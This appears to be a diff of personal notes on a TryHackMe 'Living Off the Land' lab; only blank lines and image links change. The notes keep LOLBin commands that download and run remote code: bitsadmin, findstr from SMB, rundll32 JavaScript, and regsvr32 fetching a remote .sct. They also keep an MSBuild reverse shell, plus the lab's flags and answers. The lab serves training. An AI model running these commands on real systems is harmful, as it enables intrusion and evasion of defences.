@@ -78,7 +78,6 @@ Whois	Provides information for a specified domain name or IP address.
 
 For more information about the Sysinternals suite, you can visit the tools' web page on Microsoft Docs here.
 
-
 Sysinternals Live
 
 One of the great features of Windows Sysinternals is that there is no installation required. Microsoft provides a Windows Sysinternals service, Sysinternals live, with various ways to use and execute the tools. We can access and use them through:
@@ -88,7 +87,6 @@ One of the great features of Windows Sysinternals is that there is no installati
     Command prompt
 
 In order to use these tools, you either download them or by entering the Sysinternal Live path \\live.sysinternals.com\tools into Windows Explorer.
-
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/75af3683c5d9263c66c2ca4a9cb23a6f.png)
 
@@ -145,7 +143,6 @@ Specific criteria are required for a tool to be a "Living Off the Land" techniqu
     Having additional interesting unintended functionality not covered by known use cases.
     Benefits an APT (Advanced Persistent Threat) or Red Team engagement.
 
-
 Please note that if you find an exciting binary that adheres to the previously mentioned criteria, you may submit your finding by visiting the [GitHub repo contribution page for more information](https://github.com/LOLBAS-Project/LOLBAS#criteria).
 
 Interesting Functionalities
@@ -159,9 +156,6 @@ The LOLBAS project accepts tool submissions that fit one of the following functi
     UAC bypass
     Dumping process memory
     DLL injection
-
-
-![[Pasted image 20220910221222.png]]
 
 Visit the LOLBAS project's website and check out its functionalities. Then, using the search bar, find the ATT&CK ID: T1040. What is the binary's name?
 *Pktmon.exe*
@@ -247,7 +241,6 @@ FindStr
 
 Findstr is a Microsoft built-in tool used to find text and string patterns in files. The findstr tool is useful in that helps users and system administrators to search within files or parsed output. For example, if we want to check whether port 8080 is open on our machine, then we can pipe the result of netstat to find that port as follows: netstat -an| findstr "445".
 
-
 However, an unintended way was found by using findstr.exe to download remote files from SMB shared folders within the network as follows,
 
 ```
@@ -270,13 +263,9 @@ Note that other tools can be used for the file operation. We suggest visiting th
 
 In the next task, we will introduce some of the tools used to execute files.
 
-![[Pasted image 20220910224019.png]]
-
-
 Run bitsadmin.exe to download a file of your choice onto the attached Windows VM. Once you have executed the command successfully, an encoded flag file will be created automatically on the Desktop. What is the file name?
 (Make sure to supply the exact arguments in order to receive the flag as follows, bitsadmin.exe /transfer /Download /priority Foreground http://10.10.x.x/file ...)
 *enc_thm_0YmFiOG_file.txt*
-
 
 Use the certutil.exe tool to decode the encoded flag file from question #1. In order to decode the file, we use -decode option as follow:
 
@@ -339,13 +328,10 @@ instance of __PARAMETERS
         ReturnValue = 0;
 };
 
-
 C:\Users\thm>
 
 	    
 ```
-
-![[Pasted image 20220910224303.png]]
 
 The previous WMIC command creates a new process of a binary of our choice, which in this case calc.exe.
 
@@ -385,7 +371,6 @@ C:\Users\thm> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.
 ```
 
 As a result of the previous execution, a copy of the script.ps1 downloaded into memory on the target machine.
-
 
 Read the above and practice these tools on the attached machine!
 *No answer needed*
@@ -504,14 +489,10 @@ Keep in mind that this section highlighted a couple of interesting tools. If you
 For more information about bypassing Windows security controls, we suggest checking the THM room: Bypassing UAC and Applocker once released!
 *No answer needed*
 
-![[Pasted image 20220910225928.png]]
-
-
 ```
 
 download 
 PS C:\Users\thm> c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll
-
 
 ┌──(kali㉿kali)-[~]
 └─$ msfconsole -q
@@ -635,7 +616,6 @@ C:\Users\thm> c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users
 
 Once we run the MSBuild command, wait a couple of seconds till we receive a reverse shell. Note that there will be no powershell.exe process is running.
 
-
 Replicate the steps of the No PowerShell technique to receive a reverse shell on port 4444. Once a connection is established, a flag will be created automatically on the desktop. What is the content of the flag file?
 (Use the MSbuild to build the malicious .csproj. Make sure to set the LPORT = 4444 on the AttackBox in order to get your flag!)
 
@@ -705,10 +685,7 @@ Copyright (C) Microsoft Corporation. All rights reserved.
 
 Build started 9/11/2022 4:18:39 AM.
 
-
 ```
-
-![[Pasted image 20220910232033.png]]
 
 *THM{23005dc4369a0eef728aa39ff8cc3be2}*
 
@@ -736,17 +713,12 @@ Astaroth malware hides command servers in YouTube channel descriptions (https://
 
 ### Conclusion 
 
-
-
 In this room, we covered the general concept of Living Off the Land as well as went through some of the examples seen and used during red team engagements. The Living Off the Land techniques can be used for various purposes, including reconnaissance, file operations, execution binaries, and persistence and bypass security measures. 
 
 Additional resources
 
     GTFOBins - The Linux version of the LOLBAS project.
     Astaroth: Banking Trojan - A real-life malware analysis where they showcase using the Living Off the Land technique used by Malware.
-
-
-
 
 Good work and keep learning!
 
